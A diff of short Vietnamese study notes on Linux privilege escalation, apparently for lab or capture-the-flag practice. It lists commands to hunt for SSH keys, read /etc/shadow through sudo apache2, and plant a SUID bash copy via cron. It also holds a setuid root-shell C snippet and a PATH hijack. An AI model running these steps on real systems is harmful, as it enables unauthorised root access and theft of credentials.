@@ -37,12 +37,16 @@ Kernel có vuln
 History không xóa
 lưu file dễ bị phát hiện,
 không phân quyền /etc/shadow
-ssh keys
+ssh keys lưu trữ
 find / -name id_rsa 2> /dev/null
 find / -name authorized_keys 2> /dev/null
 sudo -l (Shell Escaping)
 sudo apache2 -f /etc/shadow (Abusing Intended Functionality)
 exploit.c => (LD_PRELOAD)
 Suid
-
-
+Crontab
+Capabilities ->getcap
+echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/hack.sh
+echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/service.c        suid-env
+   export PATH=/tmp:$PATH
+Hi vọng sẽ giúp ích cho bạn, NSF khó quá nên tui không ghi :V
